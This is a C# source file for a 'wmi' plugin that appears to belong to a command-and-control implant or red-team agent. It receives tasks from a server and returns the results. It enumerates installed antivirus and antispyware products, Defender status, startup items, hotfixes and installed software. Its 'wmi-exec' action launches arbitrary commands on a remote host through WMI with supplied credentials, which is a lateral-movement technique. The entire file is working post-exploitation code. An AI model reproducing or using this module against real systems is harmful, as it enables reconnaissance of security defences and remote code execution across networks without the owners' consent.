using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "wmi";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            try
            {
                if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    messageManager.Write(
                        "WMI is only available on Windows",
                        job.task.id, true, "error");
                    return;
                }

                var args = JsonSerializer.Deserialize<wmi.WmiArgs>(
                    job.task.parameters) ?? new wmi.WmiArgs();

                string result = args.action switch
                {
                    "query" => ExecuteQuery(args.query, args.ns),
                    "installed-software" => ExecuteQuery(
                        "SELECT Name, Version, Vendor FROM Win32_Product", args.ns),
                    "defender-status" => ExecuteQuery(
                        "SELECT * FROM AntiVirusProduct",
                        @"root\SecurityCenter2"),
                    "startup-items" => ExecuteQuery(
                        "SELECT Name, Command, Location FROM Win32_StartupCommand", args.ns),
                    "hotfixes" => ExecuteQuery(
                        "SELECT HotFixID, InstalledOn, Description FROM Win32_QuickFixEngineering",
                        args.ns),
                    "av-enum" => EnumAvProducts(),
                    "wmi-exec" => ExecuteRemoteProcess(args),
                    _ => throw new ArgumentException($"Unknown action: {args.action}")
                };

                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = result,
                    task_id = job.task.id
                });
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }

        private string ExecuteQuery(string query, string ns)
        {
            if (string.IsNullOrEmpty(query))
                throw new ArgumentException("WMI query cannot be empty");

            var searcher = new System.Management.ManagementObjectSearcher(ns, query);
            var results = new List<Dictionary<string, object?>>();

            foreach (System.Management.ManagementObject obj in searcher.Get())
            {
                var row = new Dictionary<string, object?>();
                foreach (var prop in obj.Properties)
                {
                    row[prop.Name] = prop.Value;
                }
                results.Add(row);
                obj.Dispose();
            }

            if (results.Count == 0)
                return "No results";

            return JsonSerializer.Serialize(results,
                new JsonSerializerOptions { WriteIndented = true });
        }

        private string EnumAvProducts()
        {
            var results = new List<Dictionary<string, object?>>();

            string[] queries = new[]
            {
                "SELECT * FROM AntiVirusProduct",
                "SELECT * FROM AntiSpywareProduct"
            };

            foreach (var query in queries)
            {
                try
                {
                    var searcher = new System.Management.ManagementObjectSearcher(
                        @"root\SecurityCenter2", query);
                    foreach (System.Management.ManagementObject obj in searcher.Get())
                    {
                        var row = new Dictionary<string, object?>();
                        foreach (var prop in obj.Properties)
                        {
                            row[prop.Name] = prop.Value;
                        }
                        row["_QuerySource"] = query.Contains("AntiVirus")
                            ? "AntiVirusProduct" : "AntiSpywareProduct";
                        results.Add(row);
                        obj.Dispose();
                    }
                }
                catch (System.Management.ManagementException)
                {
                    // Class may not exist on this system, skip
                }
            }

            if (results.Count == 0)
                return "No security products found";

            return JsonSerializer.Serialize(results,
                new JsonSerializerOptions { WriteIndented = true });
        }

        private string ExecuteRemoteProcess(wmi.WmiArgs args)
        {
            if (string.IsNullOrEmpty(args.host))
                throw new ArgumentException("Host is required for wmi-exec");
            if (string.IsNullOrEmpty(args.command))
                throw new ArgumentException("Command is required for wmi-exec");

            var connOptions = new System.Management.ConnectionOptions();
            if (!string.IsNullOrEmpty(args.username) && !string.IsNullOrEmpty(args.password))
            {
                connOptions.Username = args.username;
                connOptions.Password = args.password;
            }

            var scope = new System.Management.ManagementScope(
                $@"\\{args.host}\root\cimv2", connOptions);
            scope.Connect();

            var processClass = new System.Management.ManagementClass(scope,
                new System.Management.ManagementPath("Win32_Process"), null);

            var inParams = processClass.GetMethodParameters("Create");
            inParams["CommandLine"] = args.command;

            var outParams = processClass.InvokeMethod("Create", inParams, null);
            uint returnValue = (uint)outParams["ReturnValue"];
            uint processId = (uint)outParams["ProcessId"];

            if (returnValue == 0)
                return $"Process created successfully on {args.host} (PID: {processId})";
            else
                return $"Failed to create process on {args.host} (Return: {returnValue})";
        }
    }
}
